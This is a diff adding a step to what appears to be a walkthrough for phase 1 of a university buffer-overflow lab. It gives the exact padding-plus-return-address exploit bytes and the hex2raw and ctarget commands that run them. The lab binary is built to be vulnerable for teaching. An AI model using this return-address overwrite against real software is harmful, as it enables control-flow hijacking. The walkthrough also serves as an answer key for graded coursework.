@@ -49,3 +49,18 @@ So it's address is at ```0x401919```
 When you write the bytes, you need to consider the byte order. My system is a little-endian so the bytes go in reverse order.
 
 Finally create a text file named phase1.txt which will look like below
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* the first 24 bytes are just padding */
+40 19 19 00 00 00 00 00 /* address of touch1 */
+```
+Now you need to take this file and run it through the program hex2raw, which will generate raw exploit strings
+
+```./hex2raw < phase1.txt > raw-phase1.txt```
+
+Finally, you run the raw file
+
+```./ctarget < raw-phase1.txt```
+
+You will get something like below if your solution is right.
